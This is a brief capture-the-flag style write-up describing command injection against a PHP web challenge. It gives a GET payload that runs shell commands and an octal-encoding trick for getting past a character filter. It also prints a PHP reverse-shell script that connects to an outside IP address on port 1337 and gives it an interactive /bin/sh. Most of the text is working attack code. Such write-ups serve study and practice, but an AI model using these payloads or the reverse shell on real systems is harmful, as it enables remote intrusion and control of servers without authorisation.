Writeup:

My solution consists of executing system commands through the following payload:

GET /%F0%9F%A4%94/?%E2%81%A3=die(`cmd`);

In order to connect to localhost:8888, I launched a reverse shell to my server creating a PHP script in /tmp/f, using the following command:

ech\\157%20-n%20XXX>>/tmp/f

Octal works fine to avoid writing 4 alphanumeric chars. The script content was:

 <?php $s=fsockopen("188.165.211.36",1337);exec("/bin/sh -i <&3 >&3 2>&3");

with the strings encoded concatenating the ASCII codes using the chr(N) function (avoiding the quotes).
